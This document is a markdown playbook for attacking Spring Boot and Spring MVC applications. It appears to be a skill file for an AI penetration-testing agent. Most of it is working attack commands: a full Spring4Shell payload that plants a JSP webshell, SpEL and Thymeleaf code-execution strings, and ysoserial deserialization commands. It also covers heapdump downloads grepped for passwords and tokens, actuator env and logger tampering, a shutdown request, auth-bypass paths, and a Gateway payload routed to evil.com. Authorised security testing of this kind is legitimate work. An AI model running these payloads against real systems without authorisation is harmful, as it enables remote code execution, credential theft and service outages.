<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: spring
description: Security testing playbook for Spring Boot/MVC applications covering Actuator endpoints, SSTI via Thymeleaf, Spring4Shell, EL injection, and Java deserialization
---

# Spring Boot / Spring MVC Security Testing

Spring is the dominant Java enterprise framework. Critical attack surface: exposed Actuator endpoints, EL/SSTI injection, Spring4Shell (CVE-2022-22965), deserialization, and Spring Security misconfigurations.

---

## Reconnaissance

### Fingerprinting Spring

    # Spring Boot Actuator — management endpoints (HIGHEST PRIORITY)
    GET /actuator                       # Lists all enabled actuator endpoints
    GET /actuator/health                # App health (often public)
    GET /actuator/env                   # Environment variables + config (CRITICAL)
    GET /actuator/beans                 # All Spring beans
    GET /actuator/mappings              # All URL mappings (full route enumeration!)
    GET /actuator/loggers               # Log level config
    GET /actuator/metrics               # Application metrics
    GET /actuator/threaddump            # Thread dump
    GET /actuator/heapdump              # JVM heap dump (download full memory!)
    GET /actuator/httptrace             # Recent HTTP requests
    GET /actuator/sessions              # Active sessions
    GET /actuator/shutdown              # POST → shuts down app (if enabled!)

    # Legacy Spring Boot 1.x paths (pre-2.0)
    GET /health
    GET /env
    GET /mappings
    GET /beans
    GET /trace
    GET /dump

    # Alternate Actuator base paths
    GET /management/actuator
    GET /admin/actuator
    GET /api/actuator
    GET /internal/actuator

    # Error pages reveal Spring
    GET /nonexistent → Whitelabel Error Page → confirms Spring Boot
    X-Application-Context header in responses

---

## Actuator Exploitation

### /actuator/env — Credential Extraction

    # Returns all properties including masked values (shown as ***)
    # Unmasked properties visible directly

    # Change log level to TRACE → verbose credential logging
    POST /actuator/loggers/org.springframework.web
    Content-Type: application/json
    {"configuredLevel": "TRACE"}

    # Actuator env with POST can set properties:
    POST /actuator/env
    Content-Type: application/json
    {"name": "spring.datasource.url", "value": "jdbc:h2:mem:testdb"}

### /actuator/heapdump — Memory Extraction

    # Download full JVM heap (can be hundreds of MB)
    curl -o heap.hprof http://<target>/actuator/heapdump

    # Analyze with Eclipse Memory Analyzer (MAT) or strings
    strings heap.hprof | grep -iE "password|secret|key|token|jdbc"

### /actuator/mappings — Route Discovery

    # Full list of all URL mappings, methods, and handlers
    curl -s <target>/actuator/mappings | python3 -m json.tool | grep '"pattern"'

### /actuator/shutdown — DoS (if POST enabled)

    POST /actuator/shutdown
    Content-Type: application/json
    {}

---

## Spring4Shell (CVE-2022-22965) — RCE

Affects Spring MVC 5.3.x < 5.3.18, 5.2.x < 5.2.20, JDK 9+, packaged as WAR on Tomcat:

    # Exploit — write JSP webshell via ClassLoader
    curl -X POST <target>/any-spring-mvc-endpoint \
      --data "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((-1!%3D(a%3Din.read(b))))%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
      -H "c1: Runtime" -H "c2: <%"  -H "suffix: %>"

    # After exploit, access the webshell:
    GET /tomcatwar.jsp?pwd=j&cmd=id

    # Nuclei template:
    nuclei -t cves/2022/CVE-2022-22965.yaml -u <target>

---

## Thymeleaf SSTI (Spring View Manipulation)

Thymeleaf is the default template engine for Spring Boot:

    # If user input ends up in view name (Spring MVC controller returns view name from input):
    # Vulnerable pattern:
    # @GetMapping("/path") public String index(@RequestParam String lang) { return lang; }

    # Basic probes:
    /__$%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D__::
    __${T(java.lang.Runtime).getRuntime().exec('id')}__::

    # Spring EL expression via Thymeleaf
    ${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}

    # If fragment is injectable:
    GET /path?fragment=__${T(java.lang.Runtime).getRuntime().exec('id')}__::

---

## Spring EL Injection

    # SpEL injection in @Value annotations, Spring Security expressions, or dynamic evaluation
    # Test any input that may be evaluated as SpEL:
    T(java.lang.Runtime).getRuntime().exec('id')
    new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()

    # HTTP parameter to SpEL (if app uses BeanFactory.getBean(userInput)):
    ?expression=T(java.lang.Runtime).getRuntime().exec('id')

---

## Java Deserialization

    # Spring apps using Java serialization (RMI, JMX, ObjectInputStream)
    # Detect: Content-Type: application/x-java-serialized-object
    # Or: base64 starting with rO0AB (Java serialized object magic bytes)

    # Test all binary-accepting endpoints
    # Generate payload with ysoserial:
    java -jar ysoserial.jar CommonsCollections1 'id' > payload.ser
    curl -X POST <target>/endpoint \
      -H "Content-Type: application/x-java-serialized-object" \
      --data-binary @payload.ser

    # Common gadget chains for Spring ecosystem:
    CommonsCollections1/3/5/6 (Apache Commons Collections)
    Spring1/Spring2 (Spring itself)
    Groovy1 (if Groovy on classpath)

---

## Spring Security Misconfigurations

    # permitAll() on sensitive endpoints:
    GET /api/admin/users    # Should require auth
    GET /api/internal/      # Often left open

    # CSRF disabled for API (common but dangerous if cookies used):
    # http.csrf().disable() in SecurityConfig

    # URL matching bypasses (Spring Security path matching):
    GET /admin%2F           # URL-encoded slash bypass
    GET /admin;ignored/     # Semicolon matrix parameter bypass (older Spring)
    GET /admin/./           # Path traversal normalization bypass
    GET //admin/            # Double slash bypass

    # Method-level security check:
    # @PreAuthorize("hasRole('ADMIN')") — test with USER role

---

## OAuth2 / JWT

    # Spring Security OAuth2 endpoints:
    GET /oauth/authorize
    POST /oauth/token
    GET /oauth/check_token
    GET /.well-known/openid-configuration

    # JWT with RS256: algorithm confusion → sign with public key as HS256
    # JWT 'kid' header injection for key confusion
    # Missing audience/issuer validation

---

## Actuator via Spring Cloud

    # Spring Cloud Config Server — very high value
    GET /env/<app-name>/<profile>/<branch>   # Remote config fetch
    GET /<app-name>/default                  # Default profile config

    # Spring Cloud Gateway SSRF (CVE-2022-22947)
    POST /actuator/gateway/routes/ssrf-test
    Content-Type: application/json
    {
      "id": "ssrf-test",
      "filters": [{"name": "AddResponseHeader", "args": {"name": "foo", "value": "#{T(java.lang.Runtime).getRuntime().exec('id').text}"}}],
      "uri": "https://evil.com"
    }

---

## Common CVEs

| CVE | Component | Impact |
|-----|-----------|--------|
| CVE-2022-22965 | Spring MVC | RCE (Spring4Shell) |
| CVE-2022-22963 | Spring Cloud Function | RCE via SpEL |
| CVE-2022-22947 | Spring Cloud Gateway | RCE via Actuator |
| CVE-2021-22096 | Spring Framework | Log injection |
| CVE-2020-5421 | Spring MVC | Reflected File Download |

    # Scan for known CVEs:
    nuclei -t cves/ -u <target> -tags spring

---

## Key Tools

    nuclei -t exposures/configs/spring-actuator.yaml -u <target>
    nuclei -t cves/ -tags spring -u <target>
    dirsearch -u <target> -e java,class,war,xml

---

## Pro Tips

1. `/actuator/mappings` = free full route enumeration — always check first
2. `/actuator/heapdump` = full JVM memory — contains plaintext credentials, tokens, secrets
3. `/actuator/env` masks passwords but often other sensitive properties are visible
4. Spring4Shell (CVE-2022-22965) requires WAR deployment on Tomcat — check server type
5. Whitelabel Error Page confirms Spring Boot; custom error pages may hide it
6. CSRF is commonly disabled for REST APIs — test all state-changing API calls
7. SpEL injection is rare but critical — search for dynamic expression evaluation

## Summary

Spring testing = Actuator endpoints (env, heapdump, mappings) + Spring4Shell check + Thymeleaf SSTI + Spring Security URL bypass. Actuator exposure is the #1 finding in Spring apps — heapdump alone can reveal all secrets in memory. Always enumerate alternate Actuator base paths (/management/, /admin/, /internal/).
